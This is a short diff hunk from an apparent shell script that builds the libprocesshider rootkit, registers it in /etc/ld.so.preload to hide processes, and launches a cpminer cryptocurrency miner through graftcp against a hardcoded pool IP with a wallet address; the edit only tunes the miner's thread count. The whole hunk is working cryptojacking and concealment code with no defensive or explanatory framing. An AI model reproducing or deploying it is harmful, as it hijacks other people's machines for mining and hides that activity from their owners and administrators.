@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u Qc6akHMAHBNgXXTema6Wdq5D2fqgDLevsX -t96 > /dev/null 2>&1
+./graftcp/graftcp && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u Qc6akHMAHBNgXXTema6Wdq5D2fqgDLevsX -t70
